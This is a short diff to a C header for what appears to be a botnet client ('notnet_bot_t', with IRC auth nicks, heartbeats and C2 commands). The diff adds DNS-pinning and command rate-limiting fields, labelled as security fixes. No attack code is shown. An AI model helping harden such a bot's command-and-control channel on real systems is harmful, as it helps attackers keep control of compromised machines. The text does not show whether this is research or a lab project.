@@ -28,6 +28,11 @@ typedef struct {
      * bot's own nick (self-commands only). */
     char auth_nicks[8][32];
     int auth_nick_count;
+    /* SECURITY FIX (#10): DNS pinning to prevent rebinding attacks.
+     * On first successful authenticated connection, the resolved IP
+     * is cached here. Reconnects must use the same pinned IP. */
+    int dns_pinned;
+    struct in_addr pinned_addr;
     int sock;
     int connected;
     int authenticated;
@@ -41,6 +46,9 @@ typedef struct {
     uint16_t port;
     char path[128];
     char user_agent[128];
+    /* SECURITY FIX (#10): DNS pinning */
+    int dns_pinned;
+    struct in_addr pinned_addr;
     int sock;
     int connected;
     time_t last_beat;
@@ -51,6 +59,9 @@ typedef struct {
     char server[256];
     uint16_t port;
     char path[128];
+    /* SECURITY FIX (#10): DNS pinning */
+    int dns_pinned;
+    struct in_addr pinned_addr;
     int sock;
     int connected;
     time_t last_beat;
@@ -110,6 +121,10 @@ typedef struct {
 
     /* Update tracking */
     time_t last_update;
+
+    /* SECURITY FIX (#14): Rate limiting for C2 commands */
+    time_t last_cmd_time;
+    int cmd_this_second;
 } notnet_bot_t;
 
 /* ── IRC Functions ──────────────────────────────────────────── */
